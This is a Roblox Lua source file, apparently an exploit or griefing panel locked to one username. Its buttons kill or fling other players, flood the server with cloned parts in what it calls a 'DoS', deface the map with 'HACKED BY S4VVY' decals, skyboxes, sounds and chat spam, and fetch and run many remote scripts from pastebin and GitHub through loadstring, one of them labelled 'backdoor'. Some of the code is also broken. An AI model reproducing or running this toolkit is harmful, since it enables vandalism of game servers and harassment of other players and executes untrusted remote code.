if game.Players.LocalPlayer.Name == "s4vvyReborn" then

-- Create a ScreenGui to hold the GUI elements
local gui = Instance.new("ScreenGui")
gui.Name = "ScriptSelectorGUI"
gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- Create the main frame to hold tabs and scripts
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = UDim2.new(0.6, 0, 0.8, 0)
mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true -- Make the frame active to receive mouse input
mainFrame.Parent = gui

-- Create tabs
local tabs = {"Scripts", "Settings"} -- Removed "Console" tab

-- Create tab buttons
local tabButtons = {}
for i, tabName in ipairs(tabs) do
	local tabButton = Instance.new("TextButton")
	tabButton.Text = tabName
	tabButton.Size = UDim2.new(0.2, 0, 0.1, 0)
	tabButton.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
	tabButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	tabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	tabButton.Font = Enum.Font.SourceSans
	tabButton.TextSize = 18
	tabButton.Parent = mainFrame

	-- Connect tab button click event to switch tabs
	tabButton.MouseButton1Click:Connect(function()
		for _, frame in ipairs(mainFrame:GetChildren()) do
			if frame:IsA("Frame") then
				frame.Visible = frame.Name == tabName
			end
		end
	end)

	-- Create frame for tab content
	local tabContent = Instance.new("Frame")
	tabContent.Name = tabName
	tabContent.Size = UDim2.new(1, 0, 1, 0)
	tabContent.Position = UDim2.new(0, 0, 0.1, 0)
	tabContent.BackgroundTransparency = 1
	tabContent.Visible = i == 1 -- Show the first tab by default
	tabContent.Parent = mainFrame
end

-- Create a frame for scripts tab content
local scriptsTab = mainFrame:FindFirstChild("Scripts")
local scriptsFrame = Instance.new("Frame")
scriptsFrame.Size = UDim2.new(1, 0, 1, 0)
scriptsFrame.Position = UDim2.new(0, 0, 0, 0)
scriptsFrame.BackgroundTransparency = 1
scriptsFrame.Parent = scriptsTab

-- Define the scripts to execute
local scripts = {
	{name = "teleport", script = function()
		-- Check if the LocalPlayer exists
		local player = game.Players.LocalPlayer
		if player then
			-- Check if the player's character exists
			local character = player.Character
			if character then
				-- Access the Character's properties safely
				local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
				if humanoidRootPart then
					-- Example: Teleport the player's character to a specific location
					humanoidRootPart.CFrame = CFrame.new(Vector3.new(0, 100, 0))
				end
			else
				print("Player's character not found")
			end
		else
			print("LocalPlayer not found")
		end

	end},
	{name = "Player Hickup", script = function()
		while true do
			for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
				if player ~= game:GetService("Players").LocalPlayer then
					local character = player.Character
					if character and character:FindFirstChild("HumanoidRootPart") then
						character.HumanoidRootPart.CFrame = CFrame.new(0, 1000, 0)
						character.HumanoidRootPart.Velocity = Vector3.new(0, math.huge, 0)
					end
				end
			end
			wait(1)
		end
	end},
	{name = "DDoS (Party Edition)", script =function()
		-- Malicious Script
		while true do
			wait(1)
			game.Workspace.Baseplate.BrickColor = BrickColor.Random()
			for _, player in ipairs(game.Players:GetPlayers()) do
				if player ~= game.Players.LocalPlayer then
					player.Character.Humanoid.Health = 0 -- Instantly kills all players except the local player
				end
			end
		end
	end},
	{name = "DoS", script = function()
		-- Create a new ScreenGui
		local gui = Instance.new("ScreenGui")
		gui.Name = "DoS_GUI"
		gui.Parent = game.Players.LocalPlayer.PlayerGui

		-- Create a Frame to hold the elements
		local frame = Instance.new("Frame")
		frame.Name = "MainFrame"
		frame.Size = UDim2.new(0, 200, 0, 150)
		frame.Position = UDim2.new(0.5, -100, 0.5, -75)
		frame.AnchorPoint = Vector2.new(0.5, 0.5) -- Center the frame
		frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
		frame.BorderSizePixel = 0
		frame.Parent = gui

		-- Make the GUI draggable
		local dragging
		local dragInput
		local dragStart
		local startPos

		frame.InputBegan:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseButton1 then
				dragging = true
				dragStart = input.Position
				startPos = frame.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then
						dragging = false
					end
				end)
			end
		end)

		frame.InputChanged:Connect(function(input)
			if input.UserInputType == Enum.UserInputType.MouseMovement then
				dragInput = input
			end
		end)

		game:GetService("UserInputService").InputChanged:Connect(function(input)
			if input == dragInput and dragging then
				local delta = input.Position - dragStart
				frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end
		end)

		-- Create a TextLabel for the title
		local title = Instance.new("TextLabel")
		title.Name = "TitleLabel"
		title.Size = UDim2.new(1, 0, 0, 30)
		title.BackgroundColor3 = Color3.new(0.4, 0.4, 0.4)
		title.TextColor3 = Color3.new(1, 1, 1)
		title.Text = "DoS Attack GUI"
		title.Font = Enum.Font.SourceSansBold
		title.TextSize = 18
		title.Parent = frame

		-- Create a TextButton to start the attack
		local startButton = Instance.new("TextButton")
		startButton.Name = "StartButton"
		startButton.Size = UDim2.new(0, 150, 0, 50)
		startButton.Position = UDim2.new(0.5, -startButton.Size.X.Offset / 2, 0.75, -startButton.Size.Y.Offset / 2)
		startButton.AnchorPoint = Vector2.new(0.5, 0.5)
		startButton.BackgroundColor3 = Color3.new(0.8, 0.2, 0.2)
		startButton.TextColor3 = Color3.new(1, 1, 1)
		startButton.Text = "Start DoS"
		startButton.Font = Enum.Font.SourceSansBold
		startButton.TextSize = 16
		startButton.Parent = frame

		-- Function to simulate a DoS attack
		local function startAttack()
			for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
				for _, object in ipairs(player.Character:GetChildren()) do
					if object:IsA("BasePart") then
						for i = 1, 100 do
							local newPart = object:Clone()
							newPart.Parent = game.Workspace
						end
						wait(1) -- Adjust this value to control the speed of the attack
					end
				end
			end
		end

		-- Event handler for the start button
		startButton.MouseButton1Click:Connect(startAttack)
	end},
	{name = "Baseplate Imploder", script = function()
		-- Function to duplicate a baseplate
		local function duplicateBaseplate()
			local baseplate = game.Workspace:FindFirstChildOfClass("Baseplate")
			if baseplate then
				for i = 1, 20 do
					local duplicate = baseplate:Clone()
					duplicate.Parent = game.Workspace
				end
				return true
			else
				return false
			end
		end

		-- Duplicate baseplates until there are no more
		repeat
			local success = duplicateBaseplate()
		until not success
	end},
	{name = "C00lkidd x tubers93 leak", script = function()
		wait(3)
		local tex1 = "rbxassetid://158118263"
		local tex2 = "rbxassetid://158118263"
		local tex3 = "rbxassetid://158118263"
		local tex4 = "rbxassetid://158118263"

		local w = workspace:GetDescendants()

		-- playerLeaderstats = {}

		--for i, v in pairs(playerLeaderstats) do
		--	pe = Instance.new("ParticleEmitter",v.Character.HumanoidRootPart)
		--	pe.Texture = "http://www.roblox.com/asset/?id=158118263"
		--	pe.VelocitySpread = 50
		--end

		local texture = "rbxassetid://158118263"

		local A = workspace:GetDescendants()
		local B = workspace:GetDescendants()
		local C = workspace:GetDescendants()
		local D = workspace:GetDescendants()
		local E = workspace:GetDescendants()
		local F = workspace:GetDescendants()
		for i,v in pairs(A) do
			if v:IsA("Part") then
				local d =    Instance.new("Decal",v)
				v.Decal.Face = "Top"
				v.Decal.Texture = texture        
			end
		end

		for i,v in pairs(B) do
			if v:IsA("Part") then
				local s = Instance.new("Decal",v)
				s.Face = "Front"
				s.Texture = texture
			end
		end

		for i,v in pairs(C) do
			if v:IsA("Part") then
				local h = Instance.new("Decal",v)
				h.Face = "Back"
				h.Texture = texture
			end
		end

		for i,v in pairs(D) do
			if v:IsA("Part") then
				local j = Instance.new("Decal",v)
				j.Face = "Left"
				j.Texture = texture
			end
		end

		for i,v in pairs(E) do
			if v:IsA("Part") then
				local k = Instance.new("Decal",v)
				k.Face = "Right"
				k.Texture = texture
			end
		end

		for i,v in pairs(F) do
			if v:IsA("Part") then
				local l = Instance.new("Decal",v)
				l.Face = "Bottom"
				l.Texture = texture
			end
		end

		local s = Instance.new("Sky",game:GetService("Lighting"))
		s.SkyboxBk = texture
		s.SkyboxDn = texture
		s.SkyboxFt = texture
		s.SkyboxLf = texture
		s.SkyboxRt = texture
		s.SkyboxUp = texture

		local sound = Instance.new("Sound",workspace)
		sound.Name = 'this game has been hacked by S4VVY'
		sound.SoundId = "rbxassetid://142930454"
		sound.Looped = true
		sound.Volume = 5
		sound:Play()

		local basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)}
		game.Lighting.FogStart = 25
		game.Lighting.FogEnd = 300
		game.Lighting.Ambient = basics[math.random(1,#basics)]
		while true do
			local Part = Instance.new("Part")
			Part.Parent = game.Workspace
			Part.Name = "HACKED BY S4VVY"
			-- Get the Chat service
			local ChatService = game:GetService("Chat")

			-- Define the message you want to send
			local message = "HACKED BY S4VVY"

			-- Get an array of players
			local players = game.Players:GetPlayers()
			wait(1)
			-- Send the message to the chat for each player
			for _, player in ipairs(players) do
				ChatService:Chat(Part, message, Enum.ChatColor.Red)
				wait(0.1)
			end
		end
		
	end},
	{name = "Epik House", script = function()
		-- Define the size of the house
		local houseWidth = 10
		local houseLength = 15
		local houseHeight = 7

		-- Function to create a house
		local function createHouse(position)
			local house = Instance.new("Model")
			house.Name = "AutoHouse"

			-- Create the base of the house
			local base = Instance.new("Part")
			base.Size = Vector3.new(houseWidth, 1, houseLength)
			base.Position = position
			base.Anchored = true
			base.Parent = house

			-- Create walls
			local wallTemplate = Instance.new("Part")
			wallTemplate.Size = Vector3.new(1, houseHeight, houseLength)
			wallTemplate.Anchored = true
			wallTemplate.Parent = house

			local function createWall(posX)
				local wall = wallTemplate:Clone()
				wall.Position = Vector3.new(position.X + posX, houseHeight/2, position.Z)
				wall.Parent = house
			end

			createWall(houseWidth/2 - 0.5)
			createWall(-(houseWidth/2 - 0.5))

			-- Create roof
			local roof = wallTemplate:Clone()
			roof.Size = Vector3.new(houseWidth, 1, houseLength)
			roof.Position = Vector3.new(position.X, houseHeight, position.Z)
			roof.Parent = house

			-- Create door
			local door = Instance.new("Part")
			door.Size = Vector3.new(3, 5, 0.1)
			door.Position = Vector3.new(position.X, 2.5, position.Z + houseLength/2)
			door.Anchored = true
			door.Parent = house

			house.Parent = game.Workspace
		end

		-- Connect function to part placed event
		game.Workspace.Changed:Connect(function(property)
			if property == "ChildAdded" then
				local part = game.Workspace:GetChildren()[1]
				createHouse(part.Position)
			end
		end)
	end},
	{name = "message spam", script = function()
		while true do
			local msg = Instance.new("Message")
			msg.Parent = game.Workspace
			msg.Text = "HACKED BY S4VVY"
			msg.Name = math.random(1, 1000)
			wait(10)
			msg:Remove()
		end
	end},
	{name = "g00byd0lan script", script = function()
		local msg = Instance.new("Message")
		msg.Parent = game.Workspace
		msg.Text = "Beamed By s4vvyreborn" 
		wait(1)

		local HttpService = game:GetService("HttpService")
		local Library = loadstring(HttpService:GetAsync("https://pastebin.com/raw/vff1bQ9F"))()
		local Window = Library.CreateLib("g00byd0lan gui", "BloodTheme")

		local Tab = Window:NewTab("Script")
		local Section = Tab:NewSection("Destroy")


		Section:NewButton("Skybox", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/7j19LHqB"))()
		end)

		Section:NewButton("Particle", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/LyDPQhjB"))()
		end)

		Section:NewButton("Dualspam", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/cr7UdxNM"))()
		end)

		Section:NewButton("Night", "ButtonInfo", function()
			while true do 
				print ("Loop cycle start")
				game.Lighting.TimeOfDay = "23:00:00"
				wait(0.5)
			end
		end)

		Section:NewButton("Disco", "ButtonInfo", function()
			while true do
				wait(0.5)
				game.Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
				game.Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
				game.Lighting.ColorShift_Bottom = Color3.new(math.random(), math.random(), math.random())
				game.Lighting.ShadowColor = Color3.new(math.random(), math.random(), math.random())
			end
		end)

		Section:NewButton("Hint", "ButtonInfo", function()
			local H = Instance.new("Hint", game.Workspace)
			H.Parent = game.Workspace
			H.Text = ("s4vvy reborn, join today")
			wait(5)

			local music = Instance.new("Sound", game.Workspace)
			music.SoundId = "rbxassetid://1847661783"
			music.Volume = 9999999999999999999999
			music.Looped = true
			music.PlayOnRemove = true
			music:Play()
		end)

		Section:NewButton("666", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/d56eg7r9"))()
		end)

		Section:NewButton("Skrub", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/6PwfSzJi"))()
		end)

		Section:NewButton("c00l4l4n", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/U9SFjNiq"))()
		end)

		Section:NewButton("Rekt", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/H5td8jx4"))()
		end)

		Section:NewButton("Tuber93 Skybox", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/2VCH6qbW"))()
		end)

		Section:NewButton("Tuber93 Dualspam", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/v9ynTi23"))()
		end)

		Section:NewButton("Skeleton sky", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/pzj2zG8m"))()
		end)

		Section:NewButton("Skeleton Dualspam", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/M7PxunKp"))()
		end)

		Section:NewButton("Doritus particle", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/KWmEQMkq"))()
		end)

		Section:NewButton("mlg particle", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/nriGxMtT"))()
		end)

		Section:NewButton("Music", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/fJVpyWb6"))()
		end)

		Section:NewButton("Extra disco", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/AEhFRTNU"))()
		end)

		Section:NewButton("While", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/3MAUYqDv"))()
		end)

		Section:NewButton("SCRIPT BY Vector THX TO USE", "ButtonInfo", function()
			print("S4VVYREBORN IS HERE")
		end)

		--gui

		local Tab = Window:NewTab("GUI")
		local GUISection = Tab:NewSection("Script")


		GUISection:NewButton("c00lkidd gui", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/HkE93XjW"))()
		end)

		GUISection:NewButton("1x1x1x1 gui", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/CYye6uA4"))()
		end)

		GUISection:NewButton("backdoor", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/L1ghtingBolt/FraktureSS/master/unobfuscated.lua"))()
		end)

		GUISection:NewButton("Ck2 gui", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/ckid", true))()
		end)

		GUISection:NewButton("NewCk2 gui", "ButtonInfo", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/sinret/rbxscript.com-scripts-reuploads-/main/apanel", true))()
		end)

		GUISection:NewButton("legacy", "ButtonInfo", function()
			loadstring(game:GetObjects("rbxassetid://1683559539")[1].Source)()
		end)

		GUISection:NewButton("USPLoader", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/Htg74KBd"))()
		end)

		GUISection:NewButton("Mini c00lkidd", "ButtonInfo", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/UPZCQ31W"))()
		end)

		GUISection:NewButton("SuckDicker", "ButtonInfo", function()
			loadstring(game:HttpGet(('https://raw.githubusercontent.com/TheRobloxSS/zetra/main/ZetPanel'),true))()
		end)
	end},
	
	{name = "Tanker V1", script = function()
		local function createTreeView(parent, object)
			local item = Instance.new("TextLabel")
			item.Parent = parent
			item.Size = UDim2.new(1, 0, 0, 20)
			item.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			item.TextColor3 = Color3.fromRGB(0, 0, 0)
			item.Text = object.Name 
			item.TextSize = 14
			item.TextXAlignment = Enum.TextXAlignment.Left
			item.BorderSizePixel = 0

			local children = object:GetChildren()
			if #children > 0 then
				local sublist = Instance.new("Frame")
				sublist.Name = "SubList"
				sublist.Parent = parent
				sublist.Size = UDim2.new(1, 0, 0, 0)
				sublist.Position = UDim2.new(0, 0, 1, 0)
				sublist.Visible = false

				local toggleButton = Instance.new("TextButton")
				toggleButton.Parent = item
				toggleButton.Size = UDim2.new(0, 20, 1, 0)
				toggleButton.Position = UDim2.new(0, -20, 0, 0)
				toggleButton.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
				toggleButton.TextColor3 = Color3.fromRGB(0, 0, 0)
				toggleButton.Text = "+"
				toggleButton.Font = Enum.Font.SourceSans
				toggleButton.TextSize = 14
				toggleButton.BorderSizePixel = 0
				toggleButton.ZIndex = 2
				toggleButton.MouseButton1Click:Connect(function()
					if sublist.Visible then
						sublist.Visible = false
						toggleButton.Text = "+"
					else
						sublist.Visible = true
						toggleButton.Text = "-"
					end
				end)

				for _, child in ipairs(children) do
					createTreeView(sublist, child)
				end
			end
		end

		local gui = Instance.new("ScreenGui")
		gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 200, 1, 0)
		frame.Position = UDim2.new(0, 0, 0, 0)
		frame.BackgroundTransparency = 0.5
		frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		frame.BorderSizePixel = 0
		frame.Parent = gui

		local layout = Instance.new("UIListLayout")
		layout.Parent = frame
		layout.Padding = UDim.new(0, 5)
		layout.VerticalAlignment = Enum.VerticalAlignment.Top
		layout.HorizontalAlignment = Enum.HorizontalAlignment.Left

		while true do
			for _, child in ipairs(game.Workspace:GetChildren()) do
				createTreeView(frame, child)
				
			end
			wait(10)
			frame:ClearAllChildren()
		end
	end},

}

for i, scriptInfo in ipairs(scripts) do
	local button = Instance.new("TextButton")
	button.Text = scriptInfo.name
	button.Size = UDim2.new(0.8, 0, 0.1, 0)
	button.Position = UDim2.new(0.1, 0, 0.1 + (i - 1) * 0.15, 0)
	button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	button.TextColor3 = Color3.fromRGB(255, 255, 255)
	button.Font = Enum.Font.SourceSans
	button.TextSize = 18
	button.Parent = scriptsFrame

	button.MouseButton1Click:Connect(function()
		scriptInfo.script()
	end)
end

local settingsTab = mainFrame:FindFirstChild("Settings")
local settingsFrame = Instance.new("Frame")
settingsFrame.Size = UDim2.new(1, 0, 1, 0)
settingsFrame.Position = UDim2.new(0, 0, 0, 0)
settingsFrame.BackgroundTransparency = 1
settingsFrame.Parent = settingsTab

local settings = {
	{name = "Background Color", property = "BackgroundColor3"},
	{name = "Transparency", property = "BackgroundTransparency"},
	{name = "Border Size", property = "BorderSizePixel"},
}

for i, setting in ipairs(settings) do
	local nameLabel = Instance.new("TextLabel")
	nameLabel.Text = setting.name
	nameLabel.Size = UDim2.new(0.3, 0, 0.1, 0)
	nameLabel.Position = UDim2.new(0.1, 0, 0.1 + (i - 1) * 0.15, 0)
	nameLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	nameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	nameLabel.Font = Enum.Font.SourceSans
	nameLabel.TextSize = 18
	nameLabel.Parent = settingsFrame

	local slider = Instance.new("TextButton")
	slider.Text = "Change"
	slider.Size = UDim2.new(0.6, 0, 0.1, 0)
	slider.Position = UDim2.new(0.4, 0, 0.1 + (i - 1) * 0.15, 0)
	slider.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	slider.TextColor3 = Color3.fromRGB(255, 255, 255)
	slider.Font = Enum.Font.SourceSans
	slider.TextSize = 18
	slider.Parent = settingsFrame

	local dialogFrame = Instance.new("Frame")
	dialogFrame.Name = "DialogFrame"
	dialogFrame.Size = UDim2.new(0.5, 0, 0.3, 0)
	dialogFrame.Position = UDim2.new(0.25, 0, 0.3, 0)
	dialogFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	dialogFrame.BorderSizePixel = 0
	dialogFrame.Visible = false
	dialogFrame.Parent = gui

	local valueInput = Instance.new("TextBox")
	valueInput.Size = UDim2.new(0.8, 0, 0.5, 0)
	valueInput.Position = UDim2.new(0.1, 0, 0.1, 0)
	valueInput.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	valueInput.TextColor3 = Color3.fromRGB(255, 255, 255)
	valueInput.Font = Enum.Font.SourceSans
	valueInput.TextSize = 18
	valueInput.Parent = dialogFrame

	local confirmButton = Instance.new("TextButton")
	confirmButton.Text = "Confirm"
	confirmButton.Size = UDim2.new(0.4, 0, 0.4, 0)
	confirmButton.Position = UDim2.new(0.3, 0, 0.7, 0)
	confirmButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
	confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	confirmButton.Font = Enum.Font.SourceSans
	confirmButton.TextSize = 18
	confirmButton.Parent = dialogFrame

	slider.MouseButton1Click:Connect(function()
		dialogFrame.Visible = true
	end)


	confirmButton.MouseButton1Click:Connect(function()
		local newValue = valueInput.Text
		if setting.property == "BackgroundColor3" then
			newValue = Color3.fromRGB(newValue)
		else
			newValue = tonumber(newValue)
		end
		mainFrame[setting.property] = newValue
		slider.Text = tostring(newValue)
		dialogFrame.Visible = false
	end)
end

local dragging
local dragInput
local dragStart
local startPos

local function updateInput(input)
	local delta = input.Position - dragStart
	mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

mainFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragging = true
		dragStart = input.Position
		startPos = mainFrame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

mainFrame.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		dragInput = input
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if dragging and input == dragInput then
		updateInput(input)
		end
	end)
end